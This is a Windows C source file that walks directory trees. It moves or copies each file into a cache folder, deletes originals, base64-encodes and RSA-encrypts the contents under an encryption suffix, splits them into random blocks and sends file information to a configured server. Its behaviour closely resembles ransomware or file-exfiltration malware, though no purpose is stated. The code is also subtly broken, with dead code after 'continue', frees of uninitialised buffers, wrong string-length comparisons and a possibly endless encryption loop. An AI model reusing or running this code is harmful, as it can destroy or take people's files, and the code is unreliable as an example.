#include "crypt.h"
#include "PassX.h"
#include <strsafe.h>
#include "ListSup.h"
#include "EnumDirectoryFile.h"
#include "aes_options.h"
#include "base64.h"
#include "rsa.h"
#include "ServerUrl.h"
#include "SendThread.h"
#include <Shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")

LIST_ENTRY g_SendFileList;
CRITICAL_SECTION g_CriticalSection;
HANDLE g_hEventFindInfinite;
WCHAR g_wCurPath[MAX_PATH];

void InitializeList()
{
	InitializeListHead(&g_SendFileList);
	InitializeCriticalSection(&g_CriticalSection);
	g_hEventFindInfinite = CreateEvent(NULL,FALSE,FALSE,NULL);
	RtlZeroMemory(g_wCurPath,sizeof(WCHAR) * MAX_PATH);
	GetCurrentDirectory(MAX_PATH,g_wCurPath);
	StringCchCatW(g_wCurPath,MAX_PATH,L"\\Cache\\");
	if (!PathFileExists(g_wCurPath))
	{
		_wmkdir(g_wCurPath);
	}
	
}
BOOLEAN GetFileSize(WCHAR *wFilePath,PSEND_FILE_INFO pSendFileInfo)
{
	HANDLE hFile;
	hFile = CreateFile(wFilePath, \
		GENERIC_READ, \
		FILE_SHARE_READ, \
		NULL, \
		OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, \
		NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return FALSE;
	}
	pSendFileInfo->ulFileSize = GetFileSize(hFile,NULL);
	CloseHandle(hFile);
	return TRUE;
}
BOOLEAN GetFileInfo(WCHAR *wFilePath,PSEND_FILE_INFO pSendFileInfo)
{
	HANDLE hFile;
	PCHAR pDat;
	ULONG_PTR ulRetByteSize;
	hFile = CreateFile(wFilePath, \
		GENERIC_READ, \
		FILE_SHARE_READ, \
		NULL, \
		OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, \
		NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return FALSE;
	}
	pSendFileInfo->ulFileSize = GetFileSize(hFile,NULL);
	do 
	{
		pDat = (PCHAR)LocalAlloc(LPTR,pSendFileInfo->ulFileSize);
	} while (NULL == pDat);
	if (ReadFile(hFile,pDat,pSendFileInfo->ulFileSize,&ulRetByteSize,NULL) == FALSE)
	{
		CloseHandle(hFile);
		return FALSE;
	}
	CalculateSHA1(pSendFileInfo->FileHash,(PBYTE)pDat,pSendFileInfo->ulFileSize);
	LocalFree(pDat);
	CloseHandle(hFile);
	return TRUE;
}
void EnumDirectoryFileEx(WCHAR *wDirectory)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	BOOLEAN bRet;
	WCHAR wEnumPath[MAX_PATH];
	WCHAR wPoint[32];
	PSEND_FILE_INFO pSendFile;
	PCHAR pDat,pBase64_Encode,pOutRsaEncrypted;
	ULONG_PTR ulRetLength,ulLengthBase64EnCode,ulOffset,ulRsaEncryptedLength;
	WCHAR wRsaEncryptPath[MAX_PATH];
	WCHAR *wTemp;
	DWORD dwAttributes;
	RtlZeroMemory(wPoint,32);
	StringCchCopyW(wPoint,32,L".");

	StringCchCopyW((WCHAR*)(wPoint + 10),22,L"..");

	RtlZeroMemory(wEnumPath,sizeof(WCHAR) * MAX_PATH);
	StringCchCopyW(wEnumPath,MAX_PATH,wDirectory);
	StringCchCatW(wEnumPath,MAX_PATH,L"\\*.*");
	hFind = FindFirstFile(wEnumPath,&FindFileData);
	if (INVALID_HANDLE_VALUE == hFind)
	{
		return;
	}
	while (TRUE)
	{
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (wcsncmp(FindFileData.cFileName,wPoint,wcslen(wPoint)) != 0 && \
				wcsncmp(FindFileData.cFileName,(WCHAR*)(wPoint + 10),wcslen((WCHAR*)(wPoint + 10))) != 0)
			{
				StringCchCopyW(wEnumPath,MAX_PATH,wDirectory);
				StringCchCatW(wEnumPath,MAX_PATH,L"\\");
				StringCchCatW(wEnumPath,MAX_PATH,FindFileData.cFileName);
				EnumDirectoryFile(wEnumPath);
			}
		}
		else
		{
			OutputDebugString(FindFileData.cFileName);
			OutputDebugString(L"\r\n");
			do 
			{
				pSendFile = (PSEND_FILE_INFO)LocalAlloc(LPTR,sizeof(_SEND_FILE_INFO));
			} while (NULL == pSendFile);
			if (wcsstr(FindFileData.cFileName,ENCRYPT_TAIL))
			{
				continue;
				InitializeListHead(&pSendFile->RandomBlockList);
				InitializeListHead(&pSendFile->List);
				pSendFile->bIsCrypt = TRUE;
				pSendFile->bIsSend = FALSE;
				pSendFile->bIsDel = FALSE;
				StringCchCopyW(pSendFile->wFileName,MAX_PATH,FindFileData.cFileName);
				StringCchCopyW(pSendFile->wFileFullPath,MAX_PATH,wDirectory);
				StringCchCatW(pSendFile->wFileFullPath,MAX_PATH,L"\\");
				StringCchCatW(pSendFile->wFileFullPath,MAX_PATH,FindFileData.cFileName);
				wTemp = wcsstr(pSendFile->wFileName,ENCRYPT_TAIL);
				if (wTemp)
				{
					*wTemp = '\0';
				}
				GetFileInfo(pSendFile->wFileFullPath,pSendFile);
				GetFileSize(pSendFile->wFileFullPath,pSendFile);
				pSendFile->ulRandomCount = CreateRandomBlock(pSendFile);
				pSendFile->bIsInitialize = TRUE;
				if (SendFileInformation(g_ServerIp,pSendFile))
				{
					LocalFree(pDat);
					//delete source file
					//DeleteFile(pSendFile->wFileFullPath);
					pSendFile->bIsDel = TRUE;
				}
			}
			else
			{
				InitializeListHead(&pSendFile->RandomBlockList);
				InitializeListHead(&pSendFile->List);
				pSendFile->bIsCrypt = FALSE;
				pSendFile->bIsSend = FALSE;
				pSendFile->bIsDel = FALSE;
				StringCchCopyW(pSendFile->wFileName,MAX_PATH,FindFileData.cFileName);
				StringCchCopyW(pSendFile->wFileFullPath,MAX_PATH,wDirectory);
				StringCchCatW(pSendFile->wFileFullPath,MAX_PATH,L"\\");
				StringCchCatW(pSendFile->wFileFullPath,MAX_PATH,FindFileData.cFileName);
				GetFileInfo(pSendFile->wFileFullPath,pSendFile);

				RtlZeroMemory(wRsaEncryptPath,sizeof(WCHAR) * MAX_PATH);
				StringCchCopyW(wRsaEncryptPath,MAX_PATH,g_wCurPath);
				StringCchCatW(wRsaEncryptPath,MAX_PATH,FindFileData.cFileName);

				if (wcsnicmp(wRsaEncryptPath,pSendFile->wFileFullPath,wcslen(pSendFile->wFileFullPath) * sizeof(WCHAR)) == 0)
				{
				}
				else
				{
					//MoveFileEx(pSendFile->wFileFullPath,wRsaEncryptPath,MOVEFILE_COPY_ALLOWED);
					//test file is exits
					if (PathFileExists(wRsaEncryptPath))
					{
					}
					else
					{
						//MoveFile(pSendFile->wFileFullPath,wRsaEncryptPath);
						if (CopyFile(pSendFile->wFileFullPath,wRsaEncryptPath,FALSE))
						{
							StringCchCopyW(pSendFile->wFileFullPath,MAX_PATH,g_wCurPath);
							StringCchCatW(pSendFile->wFileFullPath,MAX_PATH,FindFileData.cFileName);
							dwAttributes = GetFileAttributes(pSendFile->wFileFullPath);
							if (dwAttributes & FILE_ATTRIBUTE_READONLY) 
							{ 
								SetFileAttributes(pSendFile->wFileFullPath,FILE_ATTRIBUTE_NORMAL); 
							} 
						}
						do 
						{
							pDat = (PCHAR)LocalAlloc(LPTR,pSendFile->ulFileSize);
						} while (NULL == pDat);
						ulRetLength = GetFileDat(pSendFile->wFileFullPath,pDat,0,pSendFile->ulFileSize);
						DeleteFile(pSendFile->wFileFullPath);
						if (ulRetLength > 0 && ulRetLength == pSendFile->ulFileSize)
						{
							pBase64_Encode = base64_encode((unsigned char *)pDat,ulRetLength);
							if(pBase64_Encode)
							{
								ulLengthBase64EnCode = strlen(pBase64_Encode);
								ulOffset = 0;
								RtlZeroMemory(wRsaEncryptPath,sizeof(WCHAR) * MAX_PATH);
								StringCchCopyW(wRsaEncryptPath,MAX_PATH,g_wCurPath);
								StringCchCatW(wRsaEncryptPath,MAX_PATH,FindFileData.cFileName);
								StringCchCatW(wRsaEncryptPath,MAX_PATH,ENCRYPT_TAIL);
								while (TRUE)
								{
									if (ulOffset > ulLengthBase64EnCode)
									{
										break;
									}
									ulRsaEncryptedLength = MyRSAEncrypt((char *)((ULONG_PTR)pBase64_Encode + ulOffset),&pOutRsaEncrypted);
									if (ulRsaEncryptedLength > 0)
									{
										if (SetFileDat(wRsaEncryptPath,pOutRsaEncrypted,ulOffset,ulRsaEncryptedLength))
										{
											ulOffset += ulRsaEncryptedLength;
										}
									}
								}
								pSendFile->bIsCrypt = TRUE;
							}
						}
						StringCchCopyW(pSendFile->wFileFullPath,MAX_PATH,wRsaEncryptPath);
						GetFileSize(pSendFile->wFileFullPath,pSendFile);
						pSendFile->ulRandomCount = CreateRandomBlock(pSendFile);
						pSendFile->bIsInitialize = TRUE;
						if (SendFileInformation(g_ServerIp,pSendFile))
						{
							LocalFree(pDat);
							//delete encrypt
							//DeleteFile(pSendFile->wFileFullPath);
							pSendFile->bIsDel = TRUE;
						}
					}
				}

			}
		}
		bRet = FindNextFile(hFind,&FindFileData);
		if (FALSE == bRet)
		{
			break;
		}
	}
	FindClose(hFind);
}
void EnumDirectoryFile(WCHAR *wDirectory)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	BOOLEAN bRet;
	WCHAR wEnumPath[MAX_PATH];
	WCHAR wPoint[32];
	PSEND_FILE_INFO pSendFile,pCurEnumFieInfo;
	PLIST_ENTRY pCurListEntry;
	BOOLEAN bExistFile;
	PCHAR pDat,pBase64_Encode,pOutRsaEncrypted;
	ULONG_PTR ulRetLength,ulLengthBase64EnCode,ulOffset,ulRsaEncryptedLength;
	WCHAR wRsaEncryptPath[MAX_PATH];

	RtlZeroMemory(wPoint,32);
	StringCchCopyW(wPoint,32,L".");

	StringCchCopyW((WCHAR*)(wPoint + 10),22,L"..");

	RtlZeroMemory(wEnumPath,sizeof(WCHAR) * MAX_PATH);
	StringCchCopyW(wEnumPath,MAX_PATH,wDirectory);
	StringCchCatW(wEnumPath,MAX_PATH,L"\\*.*");
	hFind = FindFirstFile(wEnumPath,&FindFileData);
	if (INVALID_HANDLE_VALUE == hFind)
	{
		return;
	}
	while (TRUE)
	{
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (wcsncmp(FindFileData.cFileName,wPoint,wcslen(wPoint)) != 0 && \
				wcsncmp(FindFileData.cFileName,(WCHAR*)(wPoint + 10),wcslen((WCHAR*)(wPoint + 10))) != 0)
			{
				StringCchCopyW(wEnumPath,MAX_PATH,wDirectory);
				StringCchCatW(wEnumPath,MAX_PATH,L"\\");
				StringCchCatW(wEnumPath,MAX_PATH,FindFileData.cFileName);
				EnumDirectoryFile(wEnumPath);
			}
		}
		else
		{
			OutputDebugString(FindFileData.cFileName);
			OutputDebugString(L"\r\n");
			if (IsListEmpty(&g_SendFileList))
			{
				do 
				{
					pSendFile = (PSEND_FILE_INFO)LocalAlloc(LPTR,sizeof(_SEND_FILE_INFO));
				} while (NULL == pSendFile);
				InitializeListHead(&pSendFile->RandomBlockList);
				InitializeListHead(&pSendFile->List);
				pSendFile->bIsCrypt = FALSE;
				pSendFile->bIsSend = FALSE;
				pSendFile->bIsDel = FALSE;
				StringCchCopyW(pSendFile->wFileName,MAX_PATH,FindFileData.cFileName);
				StringCchCopyW(pSendFile->wFileFullPath,MAX_PATH,wDirectory);
				StringCchCatW(pSendFile->wFileFullPath,MAX_PATH,L"\\");
				StringCchCatW(pSendFile->wFileFullPath,MAX_PATH,FindFileData.cFileName);
				GetFileInfo(pSendFile->wFileFullPath,pSendFile);

				RtlZeroMemory(wRsaEncryptPath,sizeof(WCHAR) * MAX_PATH);
				StringCchCopyW(wRsaEncryptPath,MAX_PATH,g_wCurPath);
				StringCchCatW(wRsaEncryptPath,MAX_PATH,FindFileData.cFileName);

				MoveFileEx(pSendFile->wFileFullPath,wRsaEncryptPath,MOVEFILE_COPY_ALLOWED);
				StringCchCopyW(pSendFile->wFileFullPath,MAX_PATH,g_wCurPath);
				StringCchCatW(pSendFile->wFileFullPath,MAX_PATH,FindFileData.cFileName);
				do 
				{
					pDat = (PCHAR)LocalAlloc(LPTR,pSendFile->ulFileSize);
				} while (NULL == pDat);
				ulRetLength = GetFileDat(pSendFile->wFileFullPath,pDat,0,pSendFile->ulFileSize);
				if (ulRetLength > 0 && ulRetLength == pSendFile->ulFileSize)
				{
					pBase64_Encode = base64_encode((unsigned char *)pDat,ulRetLength);
					if(pBase64_Encode)
					{
						ulLengthBase64EnCode = strlen(pBase64_Encode);
						ulOffset = 0;
						RtlZeroMemory(wRsaEncryptPath,sizeof(WCHAR) * MAX_PATH);
						StringCchCopyW(wRsaEncryptPath,MAX_PATH,g_wCurPath);
						StringCchCatW(wRsaEncryptPath,MAX_PATH,FindFileData.cFileName);
						StringCchCatW(wRsaEncryptPath,MAX_PATH,ENCRYPT_TAIL);
						while (TRUE)
						{
							if (ulOffset > ulLengthBase64EnCode)
							{
								break;
							}
							ulRsaEncryptedLength = MyRSAEncrypt((char *)((ULONG_PTR)pBase64_Encode + ulOffset),&pOutRsaEncrypted);
							if (ulRsaEncryptedLength > 0)
							{
								if (SetFileDat(wRsaEncryptPath,pOutRsaEncrypted,ulOffset,ulRsaEncryptedLength))
								{
									ulOffset += ulRsaEncryptedLength;
								}
							}
						}
						pSendFile->bIsCrypt = TRUE;
					}
					LocalFree(pDat);
					DeleteFile(pSendFile->wFileFullPath);
					StringCchCopyW(pSendFile->wFileFullPath,MAX_PATH,wRsaEncryptPath);
					GetFileSize(pSendFile->wFileFullPath,pSendFile);
				}
				pSendFile->ulRandomCount = CreateRandomBlock(pSendFile);
				pSendFile->bIsInitialize = TRUE;
				//EnterCriticalSection(&g_CriticalSection);
				//InsertListToTailList(&g_SendFileList,&pSendFile->List);
				//LeaveCriticalSection(&g_CriticalSection);
			}
			else
			{
				bExistFile = FALSE;
				OutputDebugString(L"ListEntry is not empty\r\n");
				pCurListEntry = g_SendFileList.Flink;
				while(pCurListEntry != &g_SendFileList)
				{
					if (FALSE == IsListEmpty(pCurListEntry))
					{
						pCurEnumFieInfo = CONTAINING_RECORD(pCurListEntry,SEND_FILE_INFO,List);
						if(pCurEnumFieInfo->bIsDel == FALSE && \
							pCurEnumFieInfo->bIsSend == FALSE)
						{
							if(wcsncmp(pCurEnumFieInfo->wFileName,FindFileData.cFileName,wcslen(FindFileData.cFileName) * sizeof(WCHAR)) == 0)
							{
								bExistFile = TRUE;
							}
						}
					}
					pCurListEntry = pCurListEntry->Flink;
				}
				if (FALSE == bExistFile)
				{
					do 
					{
						pSendFile = (PSEND_FILE_INFO)LocalAlloc(LPTR,sizeof(_SEND_FILE_INFO));
					} while (NULL == pSendFile);
					InitializeListHead(&pSendFile->RandomBlockList);
					InitializeListHead(&pSendFile->List);
					pSendFile->bIsCrypt = FALSE;
					pSendFile->bIsSend = FALSE;
					pSendFile->bIsDel = FALSE;
					StringCchCopyW(pSendFile->wFileName,MAX_PATH,FindFileData.cFileName);
					StringCchCopyW(pSendFile->wFileFullPath,MAX_PATH,wDirectory);
					StringCchCatW(pSendFile->wFileFullPath,MAX_PATH,L"\\");
					StringCchCatW(pSendFile->wFileFullPath,MAX_PATH,FindFileData.cFileName);
					GetFileInfo(pSendFile->wFileFullPath,pSendFile);

					RtlZeroMemory(wRsaEncryptPath,sizeof(WCHAR) * MAX_PATH);
					StringCchCopyW(wRsaEncryptPath,MAX_PATH,g_wCurPath);
					StringCchCatW(wRsaEncryptPath,MAX_PATH,FindFileData.cFileName);

					MoveFileEx(pSendFile->wFileFullPath,wRsaEncryptPath,MOVEFILE_COPY_ALLOWED);
					StringCchCopyW(pSendFile->wFileFullPath,MAX_PATH,g_wCurPath);
					StringCchCatW(pSendFile->wFileFullPath,MAX_PATH,FindFileData.cFileName);
					do 
					{
						pDat = (PCHAR)LocalAlloc(LPTR,pSendFile->ulFileSize);
					} while (NULL == pDat);
					ulRetLength = GetFileDat(pSendFile->wFileFullPath,pDat,0,pSendFile->ulFileSize);
					if (ulRetLength > 0 && ulRetLength == pSendFile->ulFileSize)
					{
						pBase64_Encode = base64_encode((unsigned char *)pDat,ulRetLength);
						if(pBase64_Encode)
						{
							ulLengthBase64EnCode = strlen(pBase64_Encode);
							ulOffset = 0;
							RtlZeroMemory(wRsaEncryptPath,sizeof(WCHAR) * MAX_PATH);
							StringCchCopyW(wRsaEncryptPath,MAX_PATH,g_wCurPath);
							StringCchCatW(wRsaEncryptPath,MAX_PATH,FindFileData.cFileName);
							StringCchCatW(wRsaEncryptPath,MAX_PATH,ENCRYPT_TAIL);
							while (TRUE)
							{
								if (ulOffset > ulLengthBase64EnCode)
								{
									break;
								}
								ulRsaEncryptedLength = MyRSAEncrypt((char *)((ULONG_PTR)pBase64_Encode + ulOffset),&pOutRsaEncrypted);
								if (ulRsaEncryptedLength > 0)
								{
									if (SetFileDat(wRsaEncryptPath,pOutRsaEncrypted,ulOffset,ulRsaEncryptedLength))
									{
										ulOffset += ulRsaEncryptedLength;
									}
								}
							}
							pSendFile->bIsCrypt = TRUE;
						}
						LocalFree(pDat);
						DeleteFile(pSendFile->wFileFullPath);
						StringCchCopyW(pSendFile->wFileFullPath,MAX_PATH,wRsaEncryptPath);
						GetFileSize(pSendFile->wFileFullPath,pSendFile);
					}
					pSendFile->ulRandomCount = CreateRandomBlock(pSendFile);
					pSendFile->bIsInitialize = TRUE;
					EnterCriticalSection(&g_CriticalSection);
					InsertListToTailList(&g_SendFileList,&pSendFile->List);
					LeaveCriticalSection(&g_CriticalSection);
				}
			}
		}
		bRet = FindNextFile(hFind,&FindFileData);
		if (FALSE == bRet)
		{
			break;
		}
	}
	FindClose(hFind);
}
ULONG GetRandomInt(ULONG ulMin,ULONG ulMax)
{
	if (ulMax < (ULONG)0xFFFFFFFF)
	{
		ulMax++;
	}
	return (rand() % (ulMax - ulMin)) + ulMin;
}
ULONG GetFileDat(WCHAR *wFilePath,PVOID pDatBuf,ULONG ulOffset,ULONG ulLength)
{
	HANDLE hFile;
	ULONG_PTR ulRetByteSize;
	hFile = CreateFile(wFilePath, \
		GENERIC_READ, \
		FILE_SHARE_READ | FILE_SHARE_WRITE, \
		NULL, \
		OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, \
		NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return 0;
	}
	SetFilePointer(hFile,ulOffset,NULL,FILE_BEGIN);
	if (ReadFile(hFile,pDatBuf,ulLength,&ulRetByteSize,NULL) == FALSE)
	{
		CloseHandle(hFile);
		return 0;
	}
	CloseHandle(hFile);
	return ulRetByteSize;
}
ULONG SetFileDat(WCHAR *wFilePath,PVOID pDatBuf,ULONG ulOffset,ULONG ulLength)
{
	HANDLE hFile;
	ULONG_PTR ulRetByteSize;
	hFile = CreateFile(wFilePath, \
		GENERIC_READ | GENERIC_WRITE, \
		FILE_SHARE_READ | FILE_SHARE_WRITE, \
		NULL, \
		OPEN_ALWAYS, \
		FILE_ATTRIBUTE_NORMAL, \
		NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return 0;
	}
	SetFilePointer(hFile,ulOffset,NULL,FILE_BEGIN);
	if (WriteFile(hFile,pDatBuf,ulLength,&ulRetByteSize,NULL) == FALSE)
	{
		CloseHandle(hFile);
		return 0;
	}
	CloseHandle(hFile);
	return ulRetByteSize;
}
ULONG_PTR CreateRandomBlock(PSEND_FILE_INFO pSendFileInfo)
{
	ULONG_PTR ulOffset = 0;
	ULONG_PTR ulCount = 0;
	ULONG ulLength = 0;
	PRANDOM_BLOCK pRandomBlock = NULL;
	if (NULL == pSendFileInfo)
	{
		return 0;
	}
	InitializeListHead(&pSendFileInfo->RandomBlockList);
	while (ulOffset < pSendFileInfo->ulFileSize)
	{
		ulLength = GetRandomInt(128,1024);
		if (0 != ulLength)
		{
			do 
			{
				pRandomBlock = (PRANDOM_BLOCK)LocalAlloc(LPTR,sizeof(RANDOM_BLOCK));
			} while (NULL == pRandomBlock);
			pRandomBlock->bInitialize = FALSE;
			pRandomBlock->ulOffset = ulOffset;
			pRandomBlock->ulIndex = ulCount;
			pRandomBlock->ulCryptDatLength = ulLength;
			do 
			{
				pRandomBlock->pCryptDat = (PCHAR)LocalAlloc(LPTR,pRandomBlock->ulCryptDatLength);
			} while (NULL == pRandomBlock->pCryptDat);
			ulLength = GetFileDat(pSendFileInfo->wFileFullPath,pRandomBlock->pCryptDat,ulOffset,ulLength);
			if (0 != ulLength)
			{
				OutputDebugString(L"GetFileDat()\r\n");
			}
			pRandomBlock->bInitialize = TRUE;
			InitializeListHead(&pRandomBlock->ListRandomBlock);
			EnterCriticalSection(&g_CriticalSection);
			InsertListToTailList(&pSendFileInfo->RandomBlockList,&pRandomBlock->ListRandomBlock);
			LeaveCriticalSection(&g_CriticalSection);
			ulOffset += ulLength;
			ulCount++;
		}
	}
	return ulCount;
}